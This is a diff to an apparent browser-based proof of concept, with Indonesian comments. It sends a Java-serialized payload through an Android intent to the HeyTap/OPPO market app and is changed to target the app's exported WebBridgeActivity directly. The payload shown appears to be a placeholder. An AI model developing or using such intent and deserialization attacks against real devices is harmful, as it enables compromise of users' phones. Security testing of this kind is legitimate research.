@@ -17,8 +17,7 @@
             const payload = "rO0ABXNyABFpbnZhbGlkLnBheWxvYWQAAAAAAAAAAQIAAHhw";
             
             // Skema Intent yang paling umum digunakan untuk memicu aplikasi dari Chrome
-            const intentUrl = "intent://add?ckey=test&cb=" + payload + "#Intent;scheme=oaps;package=com.heytap.market;S.browser_fallback_url=https%3A%2F%2Fwww.google.com;end";
-
+           const intentUrl = "intent://add?ckey=test&cb=" + payload + "#Intent;scheme=oaps;package=com.heytap.market;component=com.heytap.market/com.cdo.oaps.host.old.WebBridgeActivity;end";
             try {
                 window.location.href = intentUrl;
                 document.getElementById('status').innerText = "Intent dikirim! Periksa HP/Logcat.";
